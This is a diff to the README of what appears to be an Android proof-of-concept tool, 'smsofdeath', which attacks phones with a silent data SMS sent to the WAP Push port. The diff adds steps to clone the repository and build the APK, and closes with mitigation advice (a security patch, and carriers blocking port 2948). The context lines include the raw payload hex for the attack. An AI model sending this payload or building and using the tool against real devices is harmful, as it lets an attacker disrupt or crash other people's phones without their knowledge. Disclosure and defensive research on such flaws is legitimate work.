@@ -29,3 +29,30 @@ The attack is executed via a silent data SMS sent directly to the WAP Push port.
 **Payload Hex:**
 ```text
 01 06 88 80 80 80 00 BE
+
+**Compiling the APK**
+Clone the repository:
+
+bash
+git clone https://github.com/YOUR_USERNAME/smsofdeath.git
+cd smsofdeath
+Create a local.properties file and point it to your SDK:
+
+properties
+sdk.dir=/path/to/your/Android/Sdk
+Build the debug APK:
+
+bash
+./gradlew assembleDebug
+The APK will be located at:
+
+text
+app/build/outputs/apk/debug/app-debug.apk
+
+
+To protect a device:
+
+Update to the October 2026 (or later) security patch level.
+
+Carriers can mitigate this by blocking incoming data SMS to port 2948 at the network level.
+
